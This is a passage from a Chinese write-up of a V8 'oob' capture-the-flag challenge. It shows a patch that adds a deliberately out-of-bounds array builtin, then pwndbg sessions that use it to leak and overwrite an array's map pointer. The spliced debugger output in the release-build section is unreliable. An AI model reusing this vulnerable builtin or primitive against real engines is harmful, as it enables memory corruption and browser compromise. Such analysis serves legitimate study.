     - length: 3
     - properties: 0x1574a0580c71  {
        #length: 0x19fc51e401a9  (const accessor descriptor)
     }
     - elements: 0x23ddebc4ddb9  {
               0: 1
               1: 2
               2: 3
     }
    [...]
    pwndbg> c
    Continuing.
    //对象数组
    DebugPrint: 0x23ddebc4ded1: [JSArray]
     - map: 0x13e6d5782f79  [FastProperties]
     - prototype: 0x1bb893151111 
     - elements: 0x23ddebc4deb1  [PACKED_ELEMENTS]
     - length: 2
     - properties: 0x1574a0580c71  {
        #length: 0x19fc51e401a9  (const accessor descriptor)
     }
     - elements: 0x23ddebc4deb1  {
               0: 0x23ddebc4de71 //存储的是浮点数组的地址
               1: 0x23ddebc4de91 //存储的是整型数组的地址
     }
也就是说，对象数组里面，存储的是别的对象的地址，这里存储的是浮点数组和整型数组的地址
## 漏洞分析
分析给定文件中的oob.diff,左边行开头的地方，表示diff文件增加的内容
> 该diff文件实际就是增加了一个oob函数。主要分为三部分：定义、实现和关联。
**定义**
> 为数组添加名为oob的内置函数（就是别人调用的话），内部调用的函数名是kArrayOob（实现oob的函数）
    src/bootstrapper.cc
    +    SimpleInstallFunction(isolate_, proto, "oob",
    +                          Builtins::kArrayOob,2,false);
**实现**
>   * 函数将首先检查参数的数量是否大于2（第一个参数始终是`this`参数）。如果是，则返回undefined。
>   *
> 如果只有一个参数（`this`），它将数组转换成`FixedDoubleArray`，然后返回array[length]（也就是以浮点数形式返回array[length]）
>   * 如果有两个参数（`this`和`value`），它以float形式将`value`写入`array[length]`。
>
    src/builtins/builtins-array.cc
    +BUILTIN(ArrayOob){
    +    uint32_t len = args.length();
    +    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
    +    Handle receiver;
    +    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +            isolate, receiver, Object::ToObject(isolate, args.receiver()));
    +    Handle array = Handle::cast(receiver);
    +    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
    +    uint32_t length = static_cast(array->length()->Number());
    +    if(len == 1){
    +        //read
    +        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
    +    }else{
    +        //write
    +        Handle value;
    +        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +                isolate, value, Object::ToNumber(isolate, args.at(1)));
    +        elements.set(length,value->Number());
    +        return ReadOnlyRoots(isolate).undefined_value();
    +    }
    +}
**重点**
漏洞就出在这个函数里面
  * 如果给一个参数，返回了array[length]
  * 如果给两个参数，将给定的参数写入array[length]
很显然array[length]这里冒了，访问到了数组后面的内存区域。调试看一下后面这个内存存储什么信息。
使用debug版本
    //test.js
    var a = [1.1,2.2,3.3];
    %DebugPrint(a);
    %SystemBreak();
    winter@ubuntu:~/v8/v8/out.gn/x64.debug$ gdb ./d8 
    [...]
    pwndbg> set args --allow-natives-syntax test.js 
    pwndbg> r
    [...]
    DebugPrint: 0x71b3a0cde29: [JSArray]
     - map: 0x288120f02ed9  [FastProperties]
     - prototype: 0x3086d0311111 
     - elements: 0x071b3a0cde01  [PACKED_DOUBLE_ELEMENTS]
     - length: 3
     - properties: 0x109193c80c71  {
        #length: 0x2f6f5d1801a9  (const accessor descriptor)
     }
     - elements: 0x071b3a0cde01  {
               0: 1.1
               1: 2.2
               2: 3.3
     }
    0x288120f02ed9: [Map]
     - type: JS_ARRAY_TYPE
     - instance size: 32
     - inobject properties: 0
     - elements kind: PACKED_DOUBLE_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - back pointer: 0x288120f02e89 
     - prototype_validity cell: 0x2f6f5d180609 
     - instance descriptors #1: 0x3086d0311f49 
     - layout descriptor: (nil)
     - transitions #1: 0x3086d0311eb9 Transition array #1:
         0x109193c84ba1 : (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x288120f02f29 
     - prototype: 0x3086d0311111 
     - constructor: 0x3086d0310ec1 
     - dependent code: 0x109193c802c1 
     - construction counter: 0
    [...]
    //查看elements的内存地址
    pwndbg> telescope 0x071b3a0cde01-1
    00:0000│   0x71b3a0cde00 —▸ 0x109193c814f9 ◂— 0x109193c801
    01:0008│   0x71b3a0cde08 ◂— 0x300000000
    02:0010│   0x71b3a0cde10 ◂— 0x3ff199999999999a
    03:0018│   0x71b3a0cde18 ◂— 0x400199999999999a
    04:0020│   0x71b3a0cde20 ◂— 0x400a666666666666 ('ffffff\n@')
    05:0028│   0x71b3a0cde28 —▸ 0x288120f02ed9 ◂— 0x40000109193c801
    06:0030│   0x71b3a0cde30 —▸ 0x109193c80c71 ◂— 0x109193c808
    07:0038│   0x71b3a0cde38 —▸ 0x71b3a0cde01 ◂— 0x109193c814
    //element+10开始的地方，存储的是数据
    pwndbg> p {double } 0x71b3a0cde10
    $1 = 1.1000000000000001
    pwndbg> p {double } 0x71b3a0cde18
    $2 = 2.2000000000000002
    pwndbg> p {double } 0x71b3a0cde20
    $3 = 3.2999999999999998
    //查看冒出来地址里存储的数据，发现存储的是map
    pwndbg> job 0x288120f02ed9
    0x288120f02ed9: [Map]
     - type: JS_ARRAY_TYPE
     - instance size: 32
     - inobject properties: 0
     - elements kind: PACKED_DOUBLE_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - back pointer: 0x288120f02e89 
     - prototype_validity cell: 0x2f6f5d180609 
     - instance descriptors #1: 0x3086d0311f49 
     - layout descriptor: (nil)
     - transitions #1: 0x3086d0311eb9 Transition array #1:
         0x109193c84ba1 : (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x288120f02f29 
     - prototype: 0x3086d0311111 
     - constructor: 0x3086d0310ec1 
     - dependent code: 0x109193c802c1 
     - construction counter: 0
综上，我们得到的是读写map和修改map的功能
我们在release版本下实际调试
    var a = [1.1,2.2,3.3];
    %DebugPrint(a);
    %SystemBreak();
    var data = a.oob();
    console.log("[*] oob return data:" + data.toString());
    %SystemBreak();
    a.oob(2);
    %SystemBreak();
    winter@ubuntu:~/v8/v8/out.gn/x64.release$ gdb ./d8 
    [...]
    pwndbg> set args --allow-natives-syntax test.js 
    pwndbg> r
    [...]
    0x2c5f52b0de29 
    //打印对象内存地址
    pwndbg> telescope 0x2c5f52b0de29-1
    00:0000│   0x2c5f52b0de28 —▸ 0x344502282ed9 ◂— 0x400003ee9994c01     telescope 0x2c5f52b0de01-1
    00:0000│   0x2c5f52b0de00 —▸ 0x3ee9994c14f9 ◂— 0x3ee9994c01             
    01:0008│   0x2c5f52b0de08 ◂— 0x300000000                              p {double } 0x71b3a0cde10
    $1 = 1.1000000000000001
    pwndbg> p {double } 0x71b3a0cde18
    $2 = 2.2000000000000002
    pwndbg> p {double } 0x71b3a0cde20
    $3 = 3.2999999999999998
    pwndbg> c
    Continuing.
    [*] oob return data:2.8394443558087e-310//和泄漏出来的一样
    pwndbg> p {double } 0x2c5f52b0de28
    $2 = 2.8394443558087202e-310
    pwndbg> c
    Continuing.
    pwndbg> telescope 0x2c5f52b0de01-1
    00:0000│   0x2c5f52b0de00 —▸ 0x3ee9994c14f9 ◂— 0x3ee9994c01
    01:0008│   0x2c5f52b0de08 ◂— 0x300000000
    02:0010│   0x2c5f52b0de10 ◂— 0x3ff199999999999a
    03:0018│   0x2c5f52b0de18 ◂— 0x400199999999999a
    04:0020│   0x2c5f52b0de20 ◂— 'ffffff\n@'
    05:0028│   0x2c5f52b0de28 ◂— 0x4000000000000000
    06:0030│   0x2c5f52b0de30 —▸ 0x3ee9994c0c71 ◂— 0x3ee9994c08
    07:0038│   0x2c5f52b0de38 —▸ 0x2c5f52b0de01 ◂— 0x3ee9994c14
    pwndbg> p {double } 0x2c5f52b0de28
    $3 = 2//被覆盖了
**关联**